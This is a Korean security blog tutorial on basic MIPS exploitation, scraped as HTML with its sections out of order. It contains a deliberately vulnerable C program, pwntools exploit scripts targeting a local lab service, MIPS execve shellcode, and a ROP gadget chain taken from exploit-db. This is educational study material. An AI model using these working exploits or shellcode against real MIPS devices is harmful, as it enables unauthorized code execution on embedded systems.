&lt;p&gt;&amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xB294; ra &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC5D0; sp+132 &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;#xBC84;&amp;#xD37C; &amp;#xC2DC;&amp;#xC791;: &lt;code&gt;sp + 24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;scanf()&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &lt;code&gt;sp&lt;/code&gt; &amp;#x2192; &lt;code&gt;s8 + 24&lt;/code&gt; &amp;#xC5F0;&amp;#xC0B0;&amp;#xC774; &amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; offset&amp;#xC740; 132 - 24 = 108&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *

p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)

sh = &lt;span class=&#34;hljs-number&#34;&gt;0x4006e0&lt;/span&gt;

pay = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;
pay += p32(sh)

p.sendline(pay)
p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image6.png&#34; alt=&#34;image6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;offset&amp;#xC744; &amp;#xB9DE;&amp;#xCD94;&amp;#xC5B4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD574;&amp;#xC11C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC798; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;4-2-shellcode&#34;&gt;&lt;a href=&#34;#4-2-shellcode&#34; class=&#34;headerlink&#34; title=&#34;4-2: shellcode&#34;&gt;&lt;/a&gt;4-2: shellcode&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
        sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);

        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;buf: %p\n&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC55E;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; Cache Incoherency&amp;#xB97C; &amp;#xACE0;&amp;#xB824;&amp;#xD558;&amp;#xC5EC; shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xC608;&amp;#xC81C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5ED;&amp;#xC2DC; bof&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xB418;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xACE0;, NX&amp;#xB97C; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xC5EC; &amp;#xBE4C;&amp;#xB4DC; &amp;#xD558;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C; offset&amp;#xC740; &amp;#xC774;&amp;#xC804; &amp;#xBB38;&amp;#xC81C;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image7.png&#34; alt=&#34;image7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC815;&amp;#xB9AC; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &lt;code&gt;__libc_csu_init&lt;/code&gt;&amp;#xB0B4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time

p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)

sh = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&amp;quot;&lt;/span&gt;

sleep_addr = &lt;span class=&#34;hljs-number&#34;&gt;0x00400970&lt;/span&gt;
gadget = &lt;span class=&#34;hljs-number&#34;&gt;0x00400824&lt;/span&gt;

p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;buf: &amp;quot;&lt;/span&gt;)
addr = int(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)

log.success(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addr is {}&amp;quot;&lt;/span&gt;.format(hex(addr)))

pay = sh
pay += &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * (&lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt; - len(sh))
pay += p32(sleep_addr)
pay += p32(gadget)
pay += p32(addr)

time.sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)
p.sendline(pay)
p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image8.png&#34; alt=&#34;image8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0;, &amp;#xC2A4;&amp;#xD0DD; &amp;#xC815;&amp;#xB9AC; &amp;#xAC00;&amp;#xC82F; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; shellcode &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xC2DD;&amp;#xC774; &amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Shellcode&amp;#xB294; MIPS&amp;#xC6A9;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC2E4;&amp;#xC81C;&amp;#xB85C; shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; libc base leak&amp;#xACFC; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xB530;&amp;#xB978; &amp;#xAC00;&amp;#xC82F; &amp;#xD638;&amp;#xCD9C;&amp;#xB3C4; &amp;#xD544;&amp;#xC694;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, ROP &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/48994&#34;&gt;https://www.exploit-db.com/exploits/48994&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;First ROP (sleep_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x0004c974&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab2e974&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c97c&lt;/span&gt;      move    t9, s0
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c980&lt;/span&gt;      lw      ra, (var_1ch)
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c984&lt;/span&gt;      lw      s0, (var_18h)
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c988&lt;/span&gt;      addiu   a0, zero, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; ; arg1
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c98c&lt;/span&gt;      addiu   a1, zero, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; ; arg2
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c990&lt;/span&gt;      move    a2, zero
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c994&lt;/span&gt;      jr      t9

Second ROP (stack_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab1bfa8&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt;      addiu   s0, sp, &lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fac&lt;/span&gt;      move    a0, s3
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb0&lt;/span&gt;      move    a1, s0
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb4&lt;/span&gt;      move    t9, s1
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb8&lt;/span&gt;      jalr    t9

Third ROP (call_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab226d8&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt;      move    t9, s0
&lt;span class=&#34;hljs-number&#34;&gt;0x000406dc&lt;/span&gt;      jalr    t9

payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;160&lt;/span&gt; + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xB9C1;&amp;#xD06C;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xACFC; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCCAB;&amp;#xBC88;&amp;#xC9F8; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC778;&amp;#xC790; &amp;#xC138;&amp;#xD305;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xAC12;&amp;#xC744; &lt;code&gt;0&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD560; &amp;#xB54C;, &lt;code&gt;0&lt;/code&gt;&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &lt;code&gt;zero&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAC83; &amp;#xC5ED;&amp;#xC2DC; MIPS&amp;#xC758; &amp;#xD2B9;&amp;#xC9D5;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xB450;&amp;#xBC88;&amp;#xC9F8; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC815;&amp;#xB9AC; &amp;#xAC00;&amp;#xC82F;&amp;#xC73C;&amp;#xB85C;, &amp;#xC55E;&amp;#xC120; &amp;#xC2E4;&amp;#xC2B5;&amp;#xC5D0;&amp;#xC11C; &amp;#xC18C;&amp;#xAC1C;&amp;#xD55C; &lt;code&gt;__libc_csu_init&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC5D0;&amp;#xC11C; &amp;#xC5B4;&amp;#xB835;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xCC3E;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xAC00;&amp;#xC82F;&amp;#xACFC; &amp;#xB354;&amp;#xBD88;&amp;#xC5B4; ROP &amp;#xCCB4;&amp;#xC778;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB05D;&amp;#xC73C;&amp;#xB85C; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2E4;&amp;#xC2B5;&amp;#xD558;&amp;#xAE30;&amp;#xAC00; &amp;#xC870;&amp;#xAE08; &amp;#xC5B4;&amp;#xB835;&amp;#xACE0;, CTF &amp;#xBB38;&amp;#xC81C;&amp;#xB85C; &amp;#xACF5;&amp;#xBD80;&amp;#xD574;&amp;#xBCF4;&amp;#xACE0; &amp;#xC2F6;&amp;#xC73C;&amp;#xC2E0; &amp;#xBD84;&amp;#xB4E4;&amp;#xC740; &amp;#xC544;&amp;#xB798; &amp;#xBB38;&amp;#xC81C;&amp;#xB4E4;&amp;#xC744; &amp;#xCC38;&amp;#xACE0;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB420; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hack.lu 2019 - no_risc_no_future&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HackCTF - BabyMIPS&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MIPS&amp;#xC640; &amp;#xAC19;&amp;#xC740; RISC &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB294; &amp;#xCC98;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xB0AF;&amp;#xC124;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xD2B9;&amp;#xC131;&amp;#xC5D0; &amp;#xB530;&amp;#xB978; &amp;#xC775;&amp;#xC2A4; &amp;#xAFC0;&amp;#xD301;(?)&amp;#xC5D0; &amp;#xC775;&amp;#xC219;&amp;#xD574;&amp;#xC9C0;&amp;#xBA74; &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xD560;&amp;#xB9CC; &amp;#xD55C; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xCC98;&amp;#xC74C; MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD558;&amp;#xC2DC;&amp;#xB294; &amp;#xBD84;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xC870;&amp;#xAE08;&amp;#xC774;&amp;#xB098;&amp;#xB9C8; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xB2E4;&amp;#xB978; &amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xC8FC;&amp;#xC81C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xAC10;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! &amp;#x1F44B;&amp;#x1F3FB;&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/image1.jpg">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/">

  <title>[Research] Exploitation basic in MIPS (KO) - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2025-08-21 19:00" pubdate>
      2025 8 21 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      59
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Exploitation basic in MIPS (KO)</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p>
<p><img src="image1.jpg" srcset="/img/loading.gif" alt="image1.jpg"></p>
<p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB2E4; &#xBCF4;&#xBA74;, &#xB2E4;&#xC591;&#xD55C; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; &#xD658;&#xACBD;&#xC744; &#xB9CC;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xB300;&#xBD80;&#xBD84; ARM &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC811;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; MIPS, MIPSEL &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC5ED;&#xC2DC; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xAC8C; &#xB9C8;&#xC8FC;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p>
<p>&#xC5B4;&#xC148; &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xC0DD;&#xAE34; &#xAC83;&#xBD80;&#xD130; &#xB0AF;&#xC124;&#xACE0;, &#xAC8C;&#xB2E4;&#xAC00; Cache &#xB54C;&#xBB38;&#xC5D0; &#xACE0;&#xB824;&#xD560; &#xAC83;&#xAE4C;&#xC9C0;&#x2026;</p>
